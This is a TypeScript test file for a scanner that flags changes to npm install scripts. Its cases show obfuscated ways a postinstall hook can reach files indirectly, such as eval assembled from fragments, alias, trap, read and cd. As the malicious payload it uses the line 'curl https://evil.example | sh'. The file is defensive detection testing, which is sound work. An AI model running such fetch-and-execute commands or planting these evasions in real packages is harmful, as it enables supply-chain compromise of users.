import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const shE = (body: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": "N=ok\n" + body + "./tools/$N.sh\n",
  "tools/ok.sh": "true\n",
  "docs/env": "N=../docs/run\n",
  "docs/run.sh": "true\n",
  "docs/n": "../docs/run\n",
  "README.md": "a\n",
  ...extra,
});

// Any cd, pushd, or popd word widens the file. A relative path is not resolved after it.
const cases: [string, string, Record<string, string>?, string?][] = [
  ["V1 sh E=eval; $E", "E=eval; $E 'true;.' ./docs/env\n"],
  ["V2 sh `echo eval`", "`echo ev``echo al` 'true;.' ./docs/env\n"],
  ["V3 sh $(printf ev)al", "$(printf ev)al 'true;.' ./docs/env\n"],
  ["V4 sh alias e=eval", "alias e=ev\\al\ne 'true;.' ./docs/env\n"],
  ["V5 sh set -- then \"$@\"", "set -- ev\\al; \"$@\" 'true;.' ./docs/env\n"],
  ["V6 sh trap assigns N", "trap 'N=../docs/run' USR1; kill -USR1 $$\n"],
  ["V7 sh read N < file", "read N < ./docs/n\n"],
  ["V8 sh for N in", "for N in ../docs/run; do :; done\n"],
  ["V9 sh ${N:=} after unset", "unset N; : ${N:=../docs/run}\n"],
  ["V10 sh cd docs then ./tools", "cd docs\n", { "docs/tools/ok.sh": "true\n" }, "docs/tools/ok.sh"],
  ["V11 sh getopts N", "set -- -x; getopts x N; N=../docs/run$N\n"],
  ["V12 sh IFS split N", "read -r N <<X\n../docs/run\nX\n"],
  ["V13 sh cd docs; literal ./tools/ok.sh", "cd docs\n./tools/ok.sh\n#", { "docs/tools/ok.sh": "true\n" }, "docs/tools/ok.sh"],
  ["V14 sh cd docs && ./tools/ok.sh", "cd docs && ./tools/ok.sh\n#", { "docs/tools/ok.sh": "true\n" }, "docs/tools/ok.sh"],
  ["pushd widens a relative path", "pushd docs && ./tools/ok.sh\n#", { "docs/tools/ok.sh": "true\n" }, "docs/tools/ok.sh"],
  ["popd widens a relative path", "popd\n./tools/ok.sh\n#", { "docs/tools/ok.sh": "true\n" }, "docs/tools/ok.sh"],
];

for (const [name, body, extra, target] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    const base = shE(body, extra);
    const file = target ?? "docs/run.sh";
    holds(base, file, sh);
    expect(hard(base, { ...base, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
  });
}
